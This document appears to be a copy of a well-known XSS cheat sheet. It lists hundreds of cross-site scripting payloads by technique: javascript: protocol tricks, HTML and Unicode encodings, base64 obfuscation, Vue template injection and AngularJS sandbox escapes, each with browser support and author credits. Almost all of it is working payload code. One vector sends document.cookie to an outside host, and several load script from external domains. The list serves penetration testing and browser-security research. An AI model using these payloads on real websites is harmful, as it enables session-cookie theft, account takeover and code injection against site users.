Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using template strings and location hash

<script>new Function`X${document.location.hash.substr`1`}`</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses or spaces, using template strings and location hash

<script>Function`X${document.location.hash.substr`1`}```</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS cookie exfiltration without parentheses, backticks or quotes

<video><source onerror=location=/\02.rs/+document.cookie>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS without greater than

<svg onload=alert(1)
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
XSS without greater using a HTML comment

<svg onload=alert(1)<!--
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Array based destructuring using onerror

<script>throw[onerror]=[alert],1</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Destructuring using onerror

<script>var{a:onerror}={a:alert};throw 1</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Destructuring using default values and onerror

<script>var{haha:onerror=alert}=0;throw 1</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Vector using window.name

<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
Jump to the code
Frameworks
Works in Chrome Works in Firefox Works in Safari
Bootstrap onanimationstart event

<xss class=progress-bar-animated onanimationstart=alert(1)>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Bootstrap ontransitionend event

<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
Jump to the code
Protocols
Works in Chrome Works in Firefox Works in Safari
Iframe src attribute JavaScript protocol

<iframe src="javascript:alert(1)">
Jump to the codeWorks in Firefox
Object data attribute with JavaScript protocol

<object data="javascript:alert(1)">
Jump to the codeWorks in Firefox
Embed src attribute with JavaScript protocol

<embed src="javascript:alert(1)">
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
A standard JavaScript protocol

<a href="javascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
The protocol is not case sensitive

<a href="JaVaScript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Characters \x01-\x20 are allowed before the protocol

<a href=" javascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Characters \x09,\x0a,\x0d are allowed inside the protocol

<a href="javas cript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Characters \x09,\x0a,\x0d are allowed after protocol name before the colon

<a href="javascript :alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Xlink namespace inside SVG with JavaScript protocol

<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
SVG animate tag using values

<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
SVG animate tag using to

<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
SVG set tag

<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Data protocol inside script src

<script src="data:text/javascript,alert(1)"></script>
Jump to the codeWorks in Firefox
SVG script href attribute without closing script tag

<svg><script href="data:text/javascript,alert(1)" />
Jump to the codeWorks in Chrome Works in Firefox
SVG use element Chrome/Firefox

<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Import statement with data URL

<script>import('data:text/javascript,alert(1)')</script>
Jump to the codeWorks in Safari
Base tag with JavaScript protocol rewriting relative URLS

<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
Jump to the codeWorks in Firefox
MathML makes any tag clickable

<math><x href="javascript:alert(1)">blah
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Button and formaction

<form><button formaction=javascript:alert(1)>XSS
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Input and formaction

<form><input type=submit formaction=javascript:alert(1) value=XSS>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Form and action

<form action=javascript:alert(1)><input type=submit value=XSS>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Animate tag with keytimes and multiple values

<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
JavaScript protocol with new line

<a href="javascript://%0aalert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox
Data URL with use element and base64 encoded

<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
Jump to the codeWorks in Chrome Works in Firefox
Data URL with use element

<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
Jump to the codeWorks in Chrome Works in Firefox
Animate tag with auto executing use element

<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
Jump to the codeWorks in Chrome
Embed supports code attribute

<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
Jump to the codeWorks in Chrome
Object tag supports param url

<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
Jump to the codeWorks in Chrome
Object tag supports param code

<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
Jump to the codeWorks in Chrome
Object tag supports param movie

<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
Jump to the codeWorks in Chrome
Object tag supports param src

<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
Jump to the codeWorks in Chrome Works in Safari
Assignable protocol with location

<script>location.protocol='javascript'</script>
Jump to the codeWorks in Chrome Works in Safari
Assignable protocol with anchor

<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
Jump to the codeWorks in Chrome
Navigation navigate method

<script>navigation.navigate('javascript:alert(1)')</script>
Jump to the code
Other useful attributes
Works in Chrome Works in Firefox Works in Safari
Using srcdoc attribute

<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Using srcdoc with entities

<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Click a submit element from anywhere on the page, even outside the form

<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
Jump to the codeWorks in Firefox
Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements

<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
Jump to the codeWorks in Chrome
Link elements: Access key attributes can enable XSS on normally unexploitable elements

<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Download attribute can save a copy of the current webpage

<a href=# download="filename.html">Test</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Disable referrer using referrerpolicy

<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via parameter on the window.open function

<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via name attribute in a <iframe> tag

<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via target attribute in a <base> tag

<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via target attribute in a <a> tag

<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via usemap attribute in a <img> tag

<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via target attribute in a <form> tag

<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via formtarget attribute in a <input> tag type submit

<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Set window.name via formtarget attribute in a <input> tag type image

<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>
Jump to the code
Special tags
Works in Chrome Works in Firefox Works in Safari
Redirect to a different domain

<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
Jump to the code
Meta charset attribute UTF-7

<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the code
Meta charset UTF-7

<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the code
UTF-7 BOM characters (Has to be at the start of the document) 1

+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the code
UTF-7 BOM characters (Has to be at the start of the document) 2

+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the code
UTF-7 BOM characters (Has to be at the start of the document) 3

+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the code
UTF-7 BOM characters (Has to be at the start of the document) 4

+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Upgrade insecure requests

<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Disable JavaScript via iframe sandbox

<iframe sandbox src="//portswigger-labs.net"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Disable referer

<meta name="referrer" content="no-referrer">
Jump to the code
Encoding
Works in Chrome Works in Firefox Works in Safari
Overlong UTF-8

%C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Unicode escapes

<script>\u0061lert(1)</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Unicode escapes ES6 style

<script>\u{61}lert(1)</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Unicode escapes ES6 style zero padded

<script>\u{0000000061}lert(1)</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Hex encoding JavaScript escapes

<script>eval('\x61lert(1)')</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Octal encoding

<script>eval('\141lert(1)')</script> <script>eval('alert(\061)')</script> <script>eval('alert(\61)')</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Decimal encoding with optional semi-colon

<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
SVG script with HTML encoding

<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x="&quot;,alert(1)//";</script></svg>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Decimal encoding with padded zeros

<a href="&#0000106avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Hex encoding entities

<a href="&#x6a;avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Hex encoding without semi-colon provided next character is not a-f0-9

<a href="j&#x61vascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Hex encoding with padded zeros

<a href="&#x0000006a;avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Hex encoding is not case sensitive

<a href="&#X6A;avascript:alert(1)">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
HTML entities

<a href="javascript&colon;alert(1)">XSS</a> <a href="java&Tab;script:alert(1)">XSS</a> <a href="java&NewLine;script:alert(1)">XSS</a> <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
URL encoding

<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
HTML entities and URL encoding

<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
Jump to the code
Obfuscation
Works in Chrome Works in Firefox Works in Safari
Data protocol inside script src with base64

<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Data protocol inside script src with base64 and HTML entities

<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Data protocol inside script src with base64 and URL encoding

<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Iframe srcdoc HTML encoded

<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Iframe JavaScript URL with HTML and URL encoding

<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
SVG script with unicode escapes and HTML encoding

<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Img tag with base64 encoding

<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
Jump to the code
Client-side template injection
VueJS reflected
Version:

Author:

Length:

Vector:

Copy:

Version 2

Mario Heiderich (Cure53)

41

{{constructor.constructor('alert(1)')()}}
Jump to the code
Version 2

Mario Heiderich (Cure53) & Sebastian Lekies (Google) & Eduardo Vela Nava (Google) & Krzysztof Kotowicz (Google)

62

<div v-html="''.constructor.constructor('alert(1)')()">a</div>
Jump to the code
Version 2

Gareth Heyes (PortSwigger)

39

<x v-html=_c.constructor('alert(1)')()>
Jump to the code
Version 2

Peter af Geijerstam (Swedish Shellcode Factory)

37

<x v-if=_c.constructor('alert(1)')()>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

32

{{_c.constructor('alert(1)')()}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

32

{{_v.constructor('alert(1)')()}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

32

{{_s.constructor('alert(1)')()}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

39

<p v-show="_c.constructor`alert(1)`()">
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

52

<x v-on:click='_b.constructor`alert(1)`()'>click</x>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

41

<x v-bind:a='_b.constructor`alert(1)`()'>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x @[_b.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x :[_b.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<p v-=_c.constructor`alert(1)`()>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x #[_c.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

32

<p :=_c.constructor`alert(1)`()>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

32

{{_c.constructor('alert(1)')()}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

30

{{_b.constructor`alert(1)`()}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

40

<x v-bind:is="'script'" src="//14.rs" />
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

27

<x is=script src=//⑭.₨>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

48

<x @click='_b.constructor`alert(1)`()'>click</x>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x @[_b.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x :[_b.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

<x #[_c.constructor`alert(1)`()]>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

52

<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

73

<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

31

<xyz<img/src onerror=alert(1)>>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

116

<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

59

<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

42

{{$el.ownerDocument.defaultView.alert(1)}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

56

{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

45

<img src @error=e=$event.path.pop().alert(1)>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

55

<img src @error=e=$event.composedPath().pop().alert(1)>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

30

<img src @error=this.alert(1)>
Jump to the code
Version 2

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

24

<svg@load=this.alert(1)>
Jump to the code
Version 2

Davit Karapetyan (Independent consultant)

72

<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

40

{{_openBlock.constructor('alert(1)')()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

42

{{_createBlock.constructor('alert(1)')()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

46

{{_toDisplayString.constructor('alert(1)')()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

42

{{_createVNode.constructor('alert(1)')()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

47

<p v-show=_createBlock.constructor`alert(1)`()>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

41

<x @[_openBlock.constructor`alert(1)`()]>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

42

<x @[_capitalize.constructor`alert(1)`()]>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

52

<x @click=_withCtx.constructor`alert(1)`()>click</x>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

40

<x @click=$event.view.alert(1)>click</x>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

34

{{_Vue.h.constructor`alert(1)`()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

33

{{$emit.constructor`alert(1)`()}}
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

85

<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

85

<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
Jump to the code
Version 3

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

35

<component is=script text=alert(1)>
Jump to the code
AngularJS sandbox escapes reflected
Version:

Author:

Length:

Vector:

Copy:

1.0.1 - 1.1.5

Mario Heiderich (Cure53)

41

{{constructor.constructor('alert(1)')()}}
Jump to the code
1.0.1 - 1.1.5 (shorter)

Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys)

33

{{$on.constructor('alert(1)')()}}
Jump to the code
1.2.0 - 1.2.1

Jann Horn (Google)

122

{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
Jump to the code
1.2.2 - 1.2.5

Gareth Heyes (PortSwigger)

23

{{{}.")));alert(1)//"}}
Jump to the code
1.2.6 - 1.2.18

Jan Horn (Google)

106

{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
Jump to the code
1.2.19 - 1.2.23

Mathias Karlsson (Detectify)

124

{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
Jump to the code
1.2.24 - 1.2.29

Gareth Heyes (PortSwigger)

23

{{{}.")));alert(1)//"}}
Jump to the code
1.2.27-1.2.29/1.3.0-1.3.20

Gareth Heyes (PortSwigger)

23

{{{}.")));alert(1)//"}}
Jump to the code
1.3.0

Gábor Molnár (Google)

272

{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}}
Jump to the code
1.3.3 - 1.3.18

Gareth Heyes (PortSwigger)

128

{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
Jump to the code
1.3.19

Gareth Heyes (PortSwigger)

102

{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}
Jump to the code
1.3.20

Gareth Heyes (PortSwigger)

65

{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
Jump to the code
1.4.0 - 1.4.9

Gareth Heyes (PortSwigger)

74

{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
Jump to the code
1.5.0 - 1.5.8

Ian Hickey & Gareth Heyes (PortSwigger)

79

{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
Jump to the code
1.5.9 - 1.5.11

Jann Horn (Google)

517

{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}
Jump to the code
1.5.9 - 1.5.11 shorter

Jann Horn (Google) & Lukasz Plonka

326

{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}
Jump to the code
>=1.6.0

Mario Heiderich (Cure53)

41

{{constructor.constructor('alert(1)')()}}
Jump to the code
>=1.6.0 (shorter)

Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys)

33

{{$on.constructor('alert(1)')()}}
Jump to the code
DOM based AngularJS sandbox escapes (Using orderBy or no $eval)
Version:

Author:

Length:

Vector:

Copy:

1.0.1 - 1.1.5

Mario Heiderich (Cure53)

37

constructor.constructor('alert(1)')()
Jump to the code
1.2.0 - 1.2.18

Jann Horn (Google)

118

a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
Jump to the code
1.2.19 - 1.2.23

Mathias Karlsson (Detectify)

119

toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)
Jump to the code
1.2.24 - 1.2.26

Gareth Heyes (PortSwigger)

317

{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()
Jump to the code
1.2.27-1.2.29/1.3.0-1.3.20

Gareth Heyes (PortSwigger)

20

{}.")));alert(1)//";
Jump to the code
1.4.0-1.4.5

Gareth Heyes (PortSwigger)

75

'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
Jump to the code
1.4.2-1.5.8

Gareth Heyes (PortSwigger) & Daniel Kachakil (Anvil Ventures)

70

{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'
Jump to the code
>=1.6.0

Mario Heiderich (Cure53)

37

constructor.constructor('alert(1)')()
Jump to the code
1.4.4 (without strings)

Gareth Heyes (PortSwigger)

134

